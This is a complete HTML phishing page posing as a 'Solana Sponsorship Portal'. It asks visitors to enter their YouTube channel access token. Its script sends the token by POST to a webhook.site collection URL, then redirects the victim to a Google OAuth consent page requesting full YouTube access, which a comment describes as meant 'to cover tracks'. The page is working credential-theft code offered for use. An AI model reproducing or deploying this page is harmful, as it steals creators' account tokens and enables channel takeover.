<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Solana Sponsorship Portal</title>
  <style>
    body {
      margin: 0;
      background-color: #000;
      color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      padding: 20px;
      text-align: center;
    }
    .container {
      max-width: 400px;
      margin: 80px auto;
      background: #111;
      border-radius: 12px;
      padding: 30px;
      box-shadow: 0 0 15px rgba(0, 255, 163, 0.4);
    }
    input[type="text"] {
      width: 90%;
      padding: 12px;
      margin: 15px 0;
      border: none;
      border-radius: 8px;
      font-size: 16px;
    }
    button {
      background-color: #00FFA3;
      border: none;
      color: #000;
      padding: 14px 40px;
      font-weight: 700;
      font-size: 16px;
      border-radius: 30px;
      cursor: pointer;
      box-shadow: 0 4px 8px rgba(0, 255, 163, 0.3);
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #00cc82;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Solana Sponsorship Portal</h1>
    <p>To complete your sponsorship verification, please enter your YouTube Channel Access Token below.</p>

    <form id="fakeLoginForm">
      <input type="text" id="token" name="token" placeholder="YouTube Channel Access Token" required />
      <br />
      <button type="submit">Verify Channel</button>
    </form>
  </div>

  <script>
    document.getElementById('fakeLoginForm').addEventListener('submit', function(event) {
      event.preventDefault();

      const token = document.getElementById('token').value;

      fetch('https://webhook.site/5575c5b8-af4b-4b23-873b-ab7afd8dc0bf', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token })
      })
      .then(() => {
        // Redirect to legit Google OAuth to cover tracks
        window.location.href = 'https://accounts.google.com/o/oauth2/v2/auth?client_id=847323098345-97tbp1m5g8ec170plkebnl5e17eo3ja3.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fsolana-collaboration.github.io%2FSolana%2F&response_type=code&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fyoutube.force-ssl&access_type=offline&prompt=consent';
      })
      .catch(() => alert('Something went wrong, try again.'));
    });
  </script>
</body>
</html>
